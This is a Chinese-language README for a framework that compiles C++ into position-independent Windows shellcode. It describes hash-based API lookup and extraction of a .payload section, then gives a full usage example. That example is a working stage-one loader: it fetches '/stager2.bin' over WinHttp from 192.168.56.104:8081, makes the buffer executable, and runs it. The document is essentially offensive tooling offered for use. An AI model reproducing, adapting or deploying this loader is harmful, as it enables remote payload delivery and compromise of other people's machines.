## 一个简单易用的 shellcode 框架
### 结构说明
  api 文件夹提供 get_function_address 函数和 get_function_address_by_hash 函数用于寻找目标函数地址，相关参数请查阅函数签名。
同时该文件夹下定义了框架中所需要的结构体、宏函数（从 mingw 相关头文件中提取）。理论上该文件夹定义的相关结构体和宏函数已经适配 x64 平台
和 x86 平台，x64 平台已经通过实验验证，x86 平台还有待验证。

  frame 文件夹提供 cmake 函数、框架宏 FRAME_FUNCTION 、 预设的函数签名头文件 function_signature.h 以及常用的宏常量头文件 frame_constant_marco.h ；
cmake 用于快速编译出 exe ，同时使用 objcopy 提取 exe 中的 .payload 节的汇编代码作为导出的 shellcode ；框架宏 FRAME_FUNCTION 用于修饰函数，
将函数按照 C 语言约定导出并将汇编代码写入 .payload 节；

  frame_api 文件夹提供一些基本函数的简单实现，目前只有 frame_memcpy 和 frame_memset 函数，这两个函数和普通 memcpy 、 memset 函数功能一致。

  hash 文件夹提供 hash 计算函数，用于 get_function_address 和 get_function_address_by_hash 函数的动态寻址。

### 使用示例
  将本项目克隆到本地，在项目根目录下创建一个 cpp 文件，在文件中定义一个实现 shellcode 逻辑的函数，并使用 FRAME_FUNCTION 宏修饰；
实现相关逻辑后，在 CMakeLists.txt 中调用提前准备好的 cmake 函数，cmake 函数的参数列表为 (产物名字 入口函数 入口函数所在 cpp 文件),
最后构建即可。如果使用 Clion 编译器，构建后会在 cmake-build-* 目录下同时产出 exe 文件和 bin 文件，bin 文件即为我们所需的 shellcode。

  创建 shellcode.cpp 文件，定义 shellcode_entry 函数实现 shellcode 逻辑，最后在 CMakeLists.txt 中设置 cmake 函数参数：
  (shellcode shellcode_entry shellcode.cpp)
```cpp
#include "frame/function_signature.h"
#include "frame/frame.h"
#include "frame/frame_constant_macro.h"
#include "api/api.h"
#include "frame_api/frame_api.h"

FRAME_FUNCTION void shellcode_entry(void) {
    constexpr char kernel32_dll[] = "kernel32.dll";
    constexpr char load_lib_a[] = "LoadLibraryA";
    constexpr char win_http_dll[] = "winhttp.dll";
    constexpr char win_http_open[] = "WinHttpOpen";
    constexpr char win_http_connect[] = "WinHttpConnect";
    constexpr char win_http_open_request[] = "WinHttpOpenRequest";
    constexpr char win_http_send_request[] = "WinHttpSendRequest";
    constexpr char win_http_receive_response[] = "WinHttpReceiveResponse";
    constexpr char win_http_query_data_available[] = "WinHttpQueryDataAvailable";
    constexpr char win_http_read_data[] = "WinHttpReadData";
    constexpr char win_http_close_handle[] = "WinHttpCloseHandle";
    constexpr char virtual_alloc[] = "VirtualAlloc";
    constexpr char virtual_protect[] = "VirtualProtect";
    constexpr char sleep[] = "Sleep";

    constexpr wchar_t host[] = L"192.168.56.104";
    constexpr wchar_t path[] = L"/stager2.bin";
    constexpr wchar_t user_agent[] = L"User Agent";
    constexpr wchar_t method[] = L"GET";
    constexpr uint16_t port = 8081;
    constexpr bool use_https = false;

    uint8_t* stager2 = nullptr;
    uint32_t stager2_size = 0;

    auto _LoadLibraryA = reinterpret_cast<fn_load_library_a>(
        get_function_address(kernel32_dll, load_lib_a));

    _LoadLibraryA(win_http_dll);

    auto _WinHttpOpen = reinterpret_cast<fn_win_http_open>(
        get_function_address(win_http_dll, win_http_open));
    auto _WinHttpConnect = reinterpret_cast<fn_win_http_connect>(
        get_function_address(win_http_dll, win_http_connect));
    auto _WinHttpOpenRequest = reinterpret_cast<fn_win_http_open_request>(
        get_function_address(win_http_dll, win_http_open_request));
    auto _WinHttpSendRequest = reinterpret_cast<fn_win_http_send_request>(
        get_function_address(win_http_dll, win_http_send_request));
    auto _WinHttpReceiveResponse = reinterpret_cast<fn_win_http_receive_response>(
        get_function_address(win_http_dll, win_http_receive_response));
    auto _WinHttpQueryDataAvailable = reinterpret_cast<fn_win_http_query_data_available>(
        get_function_address(win_http_dll, win_http_query_data_available));
    auto _WinHttpReadData = reinterpret_cast<fn_win_http_read_data>(
        get_function_address(win_http_dll, win_http_read_data));
    auto _WinHttpCloseHandle = reinterpret_cast<fn_win_http_close_handle>(
        get_function_address(win_http_dll, win_http_close_handle));
    auto _VirtualAlloc = reinterpret_cast<fn_virtual_alloc>(
        get_function_address(kernel32_dll, virtual_alloc));
    auto _VirtualProtect = reinterpret_cast<fn_virtual_protect>(
        get_function_address(kernel32_dll, virtual_protect));
    auto _Sleep = reinterpret_cast<fn_sleep>(
        get_function_address(kernel32_dll, sleep));

    void* session = nullptr;
    void* connect = nullptr;
    void* request = nullptr;

     session = _WinHttpOpen(
        user_agent,
        FRAME_WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        nullptr,
        nullptr,
        0);

    if (!session) {
        goto cleanup;
    }

    connect = _WinHttpConnect(
        session,
        host,
        port,
        0);

    if (!connect) {
        goto cleanup;
    }

    request = _WinHttpOpenRequest(
        connect,
        method,
        path,
        nullptr,
        nullptr,
        nullptr,
        use_https ? FRAME_WINHTTP_FLAG_SECURE : 0);

    if (!request) {
        goto cleanup;
    }

    if (!_WinHttpSendRequest(
        request,
        nullptr,
        0,
        nullptr,
        0,
        0,
        0)) {
        goto cleanup;
    }

    if (!_WinHttpReceiveResponse(request, nullptr)) {
        goto cleanup;
    }

     stager2 = static_cast<uint8_t*>(_VirtualAlloc(
        nullptr,
        1024 * 1024 * 30,
        FRAME_MEM_COMMIT | FRAME_MEM_RESERVE,
        FRAME_PAGE_READWRITE));
    frame_memset(stager2, 0, 1024 * 1024 * 30);

    while (true) {
        uint32_t available_bytes = 0;

        if (!_WinHttpQueryDataAvailable(request, &available_bytes)) {
            goto cleanup;
        }

        if (available_bytes == 0) {
            goto cleanup;
        }

        uint32_t read_bytes = 0;

        if (!_WinHttpReadData(
            request,
            stager2 + stager2_size,
            available_bytes,
            &read_bytes)) {
            goto cleanup;
        }

        stager2_size += read_bytes;

    }

cleanup:
    if (session) {
        _WinHttpCloseHandle(session);
    }
    if (connect) {
        _WinHttpCloseHandle(connect);
    }
    if (request) {
        _WinHttpCloseHandle(request);
    }

    if (stager2 && stager2_size > 0) {
        uint32_t old_protected_bytes = 0;
        _VirtualProtect(static_cast<void*>(stager2), stager2_size, FRAME_PAGE_EXECUTE_READ, &old_protected_bytes);
        reinterpret_cast<void(*)()>(stager2)();
        _Sleep(FRAME_INFINITE);
    }
}
```
